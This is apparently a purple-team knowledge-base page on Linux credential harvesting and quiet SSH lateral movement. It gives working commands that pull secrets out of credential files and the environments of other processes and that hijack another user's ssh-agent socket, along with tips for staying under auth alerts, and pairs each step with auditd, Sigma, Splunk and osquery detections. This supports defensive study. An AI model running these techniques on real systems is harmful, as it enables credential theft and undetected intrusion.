---
title: "Credential Access & Lateral Movement"
parent: "1. Linux"
nav_order: 8
---

# Linux Credential Access & Quiet Lateral Movement

*Harvest credentials from disk, memory, and agents, then move using existing trust so the auth telemetry stays flat instead of lighting up failed-auth and new-source-host alerts.*

## What & why

On an authorized engagement the goal after initial foothold is to collect reusable credentials and pivot to additional hosts without generating the two loudest Linux signals: bursts of failed authentication and brand-new source-host-to-server pairs. The quiet path prefers material that already exists on the box - SSH private keys, a live `ssh-agent` socket, cloud and Kubernetes config files, cached tokens - and reuses the trust those artifacts represent rather than guessing or spraying passwords. Reading a file or hijacking an agent socket is far quieter than authenticating wrong against a monitored service. Every technique below is paired with the exact telemetry it emits so a defender knows where to watch. Cross-reference [03 - persistence](03-persistence.md), [05 - defense evasion and log tampering](05-defense-evasion-and-log-tampering.md), and [09 - exfiltration](09-exfiltration.md).

## Technique

### Discovery: where credentials live

Enumerate without writing files or invoking obviously-flagged binaries. Most of this is plain `read()` of known paths.

```bash
# linux/bash - credential file discovery for the current user
ls -la ~/.ssh/ 2>/dev/null                 # id_rsa, id_ed25519, config, known_hosts
ls -la ~/.aws/credentials ~/.aws/config 2>/dev/null
ls -la ~/.kube/config 2>/dev/null
ls -la ~/.netrc ~/.docker/config.json 2>/dev/null
ls -la ~/.config/gcloud/ 2>/dev/null
# shell history often contains inline secrets, tokens, and connection strings
ls -la ~/.bash_history ~/.zsh_history ~/.local/share/fish/fish_history 2>/dev/null
```

Key targets and why they matter:

- `~/.ssh/id_*` - private keys. If unencrypted, immediate reuse. `ssh-keygen -y -f id_rsa` succeeding with no passphrase prompt confirms it is usable.
- `~/.ssh/known_hosts` - a map of where this host has SSH'd before. Even with `HashKnownHosts yes` the hashes can be cracked offline, but plaintext entries directly reveal pivot targets. This is target discovery without sending a single packet.
- `~/.ssh/config` - `Host` aliases, `ProxyJump`/`ProxyCommand`, `IdentityFile`, and `User` defaults reveal the intended lateral graph and which key opens which host.
- `~/.aws/credentials` - long-lived `aws_access_key_id` / `aws_secret_access_key`, plus `aws_session_token` for temporary creds.
- `~/.kube/config` - cluster API endpoints, client certs, and bearer tokens under `users[].user`.
- `~/.netrc` - cleartext `login`/`password` per `machine`, consumed by curl, git, and ftp.
- `~/.docker/config.json` - base64 registry auth in `.auths[].auth`.

### Harvesting from process memory and the environment

Secrets passed as environment variables or held in process memory never touch the credential files above, so they evade file-watch rules.

```bash
# linux/bash - read another process environment (same uid, or root)
tr '\0' '\n' < /proc/<PID>/environ        # AWS_*, *_TOKEN, DB_PASSWORD, etc.

# enumerate likely secret-bearing env across processes you can read
for p in /proc/[0-9]*; do
  tr '\0' '\n' < "$p/environ" 2>/dev/null \
    | grep -aiE 'TOKEN|SECRET|PASSWORD|API_KEY|AWS_|SESSION' \
    && echo "  ^ from $p"
done
```

Reading `/proc/<PID>/environ` requires the same uid as the target process (or `CAP_SYS_PTRACE` / root). The kernel gates this through `ptrace_may_access()`, the same check `ptrace(2)` uses, so on systems with `kernel.yama.ptrace_scope=1` a non-root user can still read environ for its own processes but not arbitrary ones.

For live secrets in heap or stack, dump readable regions of `/proc/<PID>/mem` guided by `/proc/<PID>/maps`. This needs `PTRACE_ATTACH`-equivalent access and is much louder (see OPSEC). Prefer `environ` and config files first.

### ssh-agent socket hijack (no key file touched)

If a user has a forwarded or local agent, `SSH_AUTH_SOCK` points at a UNIX socket holding loaded identities. Any process that can connect to that socket can authenticate as the user without ever reading the private key from disk - the key never leaves the agent, and the agent signs challenges on request.

```bash
# linux/bash - find live agent sockets and reuse them
env | grep SSH_AUTH_SOCK                              # for your own shell
ls -l /tmp/ssh-*/agent.* 2>/dev/null                 # local agents
# root can find any user's forwarded agent socket:
sudo find /tmp -type s -name 'agent.*' 2>/dev/null

# point your client at the victim's socket and list/use loaded keys
export SSH_AUTH_SOCK=/tmp/ssh-XXXXXX/agent.1234
ssh-add -l                                            # identities the agent holds
ssh -o IdentitiesOnly=no user@198.51.100.10          # agent signs the auth
```

To connect to a socket you must satisfy its filesystem permissions (owner uid, mode `0600` on the socket dir typically), so this is a same-user or root primitive. The win is that no `id_rsa` read event fires - detection has to come from socket access and from the downstream login, not from a sensitive-file read.

### Using found keys quietly

Once you hold a usable key, drive SSH so it produces the minimum footprint and lets you reason about exactly what lands in the target's logs.

```bash
# linux/bash - controlled, quiet ssh invocation
ssh -i /path/to/id_ed25519 \
    -o IdentitiesOnly=yes \        # only offer this key, avoid agent key-spray
    -o StrictHostKeyChecking=accept-new \
    -o LogLevel=ERROR \
    -o ConnectTimeout=5 \
    operator@198.51.100.10
```

`IdentitiesOnly=yes` matters for OPSEC: without it the client offers every key in the agent and every default `IdentityFile` in sequence. Each rejected offer is a `Failed publickey` line in the server `sshd` log. Offering exactly the one key that works produces a single `Accepted publickey` and nothing else.

### Lateral movement primitives

ProxyJump chains through a bastion using the bastion only as a TCP relay - the final session terminates on the target, and your client key authenticates end to end. The intermediate hop sees a forwarded connection, not your credentials.

```bash
# linux/bash - jump through a bastion to an internal host
ssh -J operator@bastion.example.com operator@192.0.2.50
# equivalent ~/.ssh/config:
#   Host internal-50
#     HostName 192.0.2.50
#     ProxyJump operator@bastion.example.com
#     IdentitiesOnly yes
```

Prefer `ProxyJump` (`-J`) over agent forwarding (`-A`). Agent forwarding exposes your live agent socket on every hop you land on; any root on an intermediate host can then hijack it exactly as described above and authenticate onward as you. ProxyJump keeps the signing local to your client and only relays packets.

Use `known_hosts` plus `~/.ssh/config` as a routing table to choose the next hop instead of scanning. The host already told you where it talks; following that edge looks like normal admin traffic, while a port sweep does not.

```bash
# linux/bash - turn known_hosts into a candidate target list (plaintext entries)
awk '{print $1}' ~/.ssh/known_hosts 2>/dev/null \
  | tr ',' '\n' | grep -vE '^\|1\|' | sort -u
# entries beginning |1| are HashKnownHosts hashes - not directly readable
```

### Avoiding lockouts and failed-auth bursts

- Never password-spray from a monitored host. PAM with `pam_faillock` (RHEL) or `pam_tally2` (older) increments a counter per failure and can lock the account, which is both noisy and disruptive. Each failure also writes `/var/log/btmp` and an `authentication failure` line.
- Validate a key offline before using it on a target: `ssh-keygen -y -f id_rsa >/dev/null` tells you if it is passphrase-protected without sending traffic.
- Confirm reachability with a TCP connect to 22, not a full auth attempt, when you only need to know the port is open. A completed-then-dropped TCP handshake is far less interesting than a `Failed password`.
- Reuse trust over guessing. A valid key or live agent yields `Accepted`, which blends into normal logins; a guess yields `Failed`, which is the single highest-fidelity SSH alert.

### sudo - enumerate carefully, it is logged

`sudo -l` lists your allowed commands but is recorded. On most distros every `sudo` invocation - including `-l` and every failure - is logged by the sudo plugin to `/var/log/sudo.log` or via syslog to `auth.log`/`secure`, and modern sudo can also write full I/O logs to `/var/log/sudo-io/` when `log_input`/`log_output` is set in `sudoers`.

```bash
# linux/bash - this WILL appear in auth logs
sudo -l
```

There is no covert `sudo -l`. If you only need to know whether a path to root exists, prefer reading `/etc/sudoers` and `/etc/sudoers.d/*` directly when readable, which is a file read rather than a sudo event. Treat any real `sudo` use as logged and budget for it.

## OPSEC notes

What makes the loud version loud:

- Password spraying or brute force: every miss is a `btmp` entry plus an `auth.log`/`secure` `authentication failure`, and a burst trips threshold rules and `pam_faillock` lockouts instantly.
- Offering many keys (default SSH behavior): a string of `Failed publickey` lines from one source before an `Accepted` is a recognizable signature. Fix with `IdentitiesOnly=yes`.
- Agent forwarding (`-A`): leaves your agent reachable on every hop; a compromised or monitored intermediate can both hijack it and log the forwarded socket. ProxyJump avoids this.
- Dumping `/proc/<PID>/mem`: triggers `ptrace`/`process_vm_readv` syscalls and YAMA denials, which EDR and auditd both watch closely. Prefer `environ` and config files.
- Reading `id_rsa` / `~/.aws/credentials`: trivially caught by a single auditd file watch or an EDR sensitive-file rule. The agent-socket path sidesteps the key-file read entirely.

The quiet variant: discover via `known_hosts`/`config` rather than scanning; harvest via agent hijack rather than key-file read where possible; move via ProxyJump with `IdentitiesOnly=yes`; accept that `sudo` and any real authentication produce a record and use only valid material so that record reads as `Accepted`.

Failure modes and tells:

- A new source IP authenticating to a server it has never talked to is a UEBA signal even when the auth itself succeeds. There is no way to fully suppress this from the source side; it is inherent to moving laterally. Pick source hosts that already legitimately reach the target.
- Cracked or guessed passphrases on an encrypted key are offline and silent, but using the key still creates the source-host pair above.
- `ssh-agent` hijack avoids the key-file read but the resulting login still appears in the server logs as a normal `Accepted publickey` for that user - the anomaly is the source.

## Detection & telemetry

This is where the defender wins. Each offensive step above maps to concrete, queryable artifacts.

### Authentication outcomes (sshd)

Source: `sshd` via PAM to `/var/log/auth.log` (Debian/Ubuntu) or `/var/log/secure` (RHEL), and `journalctl -u ssh`/`-u sshd`.

- Success: `Accepted publickey for <user> from <ip> port <p> ssh2: <keytype> SHA256:<fp>` - the `SHA256:` key fingerprint identifies which key authenticated. Inventory known-good fingerprints and alert on unknown ones.
- Failure: `Failed password for ...` and `Failed publickey for ...`; `Connection closed by authenticating user`. A run of `Failed publickey` from one source preceding an `Accepted` indicates key-spray (missing `IdentitiesOnly`).
- Bad-login record: every failed login is written to `/var/log/btmp` (read with `lastb`); successful logins to `/var/log/wtmp` (`last`).

```sql
-- splunk-style: failed-auth burst then success from same source
index=linux sourcetype=secure ("Failed password" OR "Failed publickey")
| stats count AS fails values(user) AS users by host, src_ip
| where fails > 5
```

```yaml
# sigma-style: new source-host to server pair (pair with UEBA baseline)
title: SSH Accepted From Unseen Source Host
logsource: { product: linux, service: sshd }
detection:
  sel:
    EventType: 'Accepted publickey'
  condition: sel
fields: [user, src_ip, ssh_fingerprint, host]
# enrichment: compare src_ip+host against historical baseline; alert if new
```

### Sensitive-file reads (auditd)

Source: auditd `SYSCALL`/`PATH` records (`ausearch -k <key>`). Place file watches on credential material:

```bash
# linux/auditd - watch reads of credential files and the user .ssh dir
auditctl -w /home -p r -k cred_read              # broad; scope per-user in prod
auditctl -a always,exit -F arch=b64 -S openat -F path=/etc/sudoers -k sudoers_read
# per-user examples (templated by your config management):
auditctl -w /home/operator/.ssh/id_rsa -p r -k sshkey_read
auditctl -w /home/operator/.aws/credentials -p r -k awscred_read
auditctl -w /home/operator/.kube/config -p r -k kubeconfig_read
```

Hunt the resulting records and resolve which process and user touched the file:

```bash
# linux/auditd - who read the keys
ausearch -k sshkey_read -i | grep -E 'comm=|uid=|exe='
ausearch -k awscred_read --start recent -i
```

Key fields: `key=` (your tag), `comm=`/`exe=` (the reading binary - alert when it is `cat`, `scp`, `python`, or anything other than `ssh`/`sshd`), `auid=` (the login uid, survives su/sudo), `uid=`, and the `PATH` record's `name=`.

### ssh-agent socket access (auditd)

The agent hijack reads/connects to a UNIX socket, not the key file, so file-read watches miss it. Watch socket access and connects instead.

```bash
# linux/auditd - watch access to agent sockets
auditctl -w /tmp -p r -k tmp_socket_access -F dir=/tmp   # noisy; scope tightly
# better: alert when SSH_AUTH_SOCK targets are connect()'d by an unexpected comm
auditctl -a always,exit -F arch=b64 -S connect -k agent_connect
```

Pair with EDR or osquery to detect a process whose `SSH_AUTH_SOCK` points at a socket it does not own, or a `ssh-add -l`/`ssh` whose `auid` differs from the socket owner. The strongest signal is one user's process signing through another user's agent, followed by an `Accepted publickey` outbound.

### Process memory and ptrace

Source: auditd syscall auditing plus the kernel YAMA log.

- `ptrace(2)`, `process_vm_readv(2)`, and opens of `/proc/<PID>/mem` are high-signal. Audit them:

```bash
# linux/auditd - flag cross-process memory access
auditctl -a always,exit -F arch=b64 -S ptrace -k ptrace_use
auditctl -a always,exit -F arch=b64 -S process_vm_readv -k procmem_read
auditctl -w /proc -p r -k proc_environ_read -F dir=/proc   # very noisy, scope
```

- With `kernel.yama.ptrace_scope >= 1`, denied attempts emit a kernel message (`ptrace of pid ... was attempted by ...`) visible in `dmesg`/`journald`. Alert on these.
- Reads of `/proc/<PID>/environ` across uid boundaries require `CAP_SYS_PTRACE`; auditing `openat` on `/proc/*/environ` with `auid != uid` of the target catches the env-harvest loop.

### osquery hunts

```sql
-- osquery: users with private key material and live agents
SELECT u.username, f.path
FROM users u
JOIN file f ON f.path LIKE u.directory || '/.ssh/id_%'
WHERE f.path NOT LIKE '%.pub';

-- osquery: processes carrying secret-bearing env (where readable)
SELECT pid, name, key, value
FROM process_envs
WHERE key IN ('AWS_SECRET_ACCESS_KEY','AWS_SESSION_TOKEN')
   OR key LIKE '%TOKEN%' OR key LIKE '%PASSWORD%';

-- osquery: sockets that look like ssh-agent endpoints
SELECT pid, socket, path FROM process_open_sockets
WHERE path LIKE '/tmp/ssh-%/agent.%';
```

### sudo

Source: the sudo plugin to `/var/log/sudo.log` or syslog `auth.log`/`secure`, and optionally `/var/log/sudo-io/` for full I/O capture when `log_input`/`log_output` is enabled. Every `sudo -l`, every authorized command, and every `command not allowed`/auth failure is recorded. Alert on `sudo -l` enumeration, on `NOPASSWD` command use outside business hours, and on `command not allowed` (failed privilege probing). The login uid (`auid`) ties the activity back to the original interactive user even after `su`/`sudo`.

### Network-layer / UEBA correlation

- New source-IP-to-destination-host SSH pairs are the highest-value lateral-movement signal; build the historical graph of who talks to whom and alert on new edges.
- Impossible-travel and fan-out: one source authenticating to many hosts in a short window, or a host receiving its first-ever inbound SSH from an internal peer.
- Bastion correlation: a ProxyJump session shows as inbound-then-outbound SSH on the bastion within milliseconds; correlate bastion `Accepted` events with downstream `Accepted` events sharing the same key fingerprint to reconstruct the chain.

## MITRE ATT&CK

- T1552.004 - Unsecured Credentials: Private Keys
- T1552.001 - Unsecured Credentials: Credentials In Files
- T1552.005 - Unsecured Credentials: Cloud Instance Metadata API (related, env/IMDS tokens)
- T1003.008 - OS Credential Dumping: /etc/passwd and /etc/shadow
- T1003.007 - OS Credential Dumping: Proc Filesystem
- T1555 - Credentials from Password Stores
- T1539 - Steal Web Session Cookie (tokens in files/env)
- T1021.004 - Remote Services: SSH
- T1563.001 - Remote Service Session Hijacking: SSH (agent/session reuse)
- T1078.003 - Valid Accounts: Local Accounts
- T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching
- T1552.003 - Unsecured Credentials: Bash History

## References

- ssh(1), ssh_config(5), ssh-agent(1), ssh-add(1), sshd(8) - OpenSSH manual pages: https://man.openbsd.org/ssh
- proc(5) - Linux man page (`/proc/<PID>/environ`, `/proc/<PID>/mem`, `/proc/<PID>/maps`): https://man7.org/linux/man-pages/man5/proc.5.html
- ptrace(2) and ptrace_scope / YAMA LSM: https://man7.org/linux/man-pages/man2/ptrace.2.html and https://www.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html
- auditctl(8), ausearch(8), audit.rules(7) - Linux audit framework: https://man7.org/linux/man-pages/man8/auditctl.8.html
- sudo(8) and sudoers(5) - logging, I/O logs, faillock interaction: https://www.sudo.ws/docs/man/sudo.man/ and https://www.sudo.ws/docs/man/sudoers.man/
- MITRE ATT&CK - Credential Access (TA0006) and Lateral Movement (TA0008): https://attack.mitre.org/tactics/TA0006/ and https://attack.mitre.org/tactics/TA0008/
- osquery schema (process_envs, process_open_sockets, file): https://osquery.io/schema/
